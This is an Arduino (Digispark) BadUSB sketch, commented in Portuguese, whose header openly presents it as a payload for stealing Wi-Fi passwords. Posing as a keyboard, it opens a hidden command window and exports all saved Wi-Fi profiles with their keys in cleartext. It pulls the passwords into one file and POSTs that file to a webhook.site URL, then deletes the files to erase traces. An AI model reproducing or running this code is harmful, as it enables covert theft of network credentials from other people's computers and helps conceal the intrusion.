/*  
 *  Payload para roubar senhas Wi-Fi de computadores, necessário atualizar o ID do webhook.site, procurar por INSIRA-SEU-ID.
 */


#include "DigiKeyboard.h"

void exploitWindows(void);

void setup() {
  //Identificando LEDs como saida de dados.
  pinMode(0, OUTPUT);
  pinMode(1, OUTPUT); 


  
}

void loop() {
  
  digitalWrite(0, LOW); 
  digitalWrite(1, LOW);
  
  exploitWindows();

  
  
}

  void exploitWindows(void){

  DigiKeyboard.update();  //Mantendo comunicação USB com o dispositivo, importante chamar esta no começo de cada payload.
  DigiKeyboard.delay(800);  // Delays como este podem ser alterados para adaptar o código para funcionar em máquinas mais lentas.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Pressionando teclas Windows + R simultaneamente, isso é um atalho para o "executar".
  DigiKeyboard.delay(100);
  
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //Abrindo uma janela CMD furtiva.
  DigiKeyboard.delay(500);
 
  delay(100); //Importante ter um delay aqui, em alguns testes o cursor escapou da janela CMD, o que causou erro na execução do payload.
    
  DigiKeyboard.println("cd %temp%"); //Movendo para o diretorio /tmp onde teremos permissão para executar o payload.
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("netsh wlan export profile key=clear"); // Pegando todas as senhas wifi e armazenando elas no diretório atual (tmp)
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-SENHA"); //Extraindo todos perfis (Logins e senhas) para um arquivo só
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/2c2fb5f4-b2da-43cc-b8a6-25e68179a93a -Method POST -InFile Wi-Fi-SENHA"); //Enviando conteudo do arquivo para o webhook através de uma requisição POST
  DigiKeyboard.delay(10000);
  
  DigiKeyboard.println("del Wi-* /s /f /q"); // Apagando seus rastros.
  DigiKeyboard.delay(100);
  
  DigiKeyboard.println("exit"); //Fechando CMD
  DigiKeyboard.delay(100);
  
  digitalWrite(0, HIGH); // Ligando LEDs para sinalizar que o arquivo já foi concluido.
  digitalWrite(1, HIGH); 

  //Reiniciando em 15 segundos caso primeira tentativa tenha falhado.
  
  DigiKeyboard.delay(15000);  //Função delay já incluida .update
    
  }
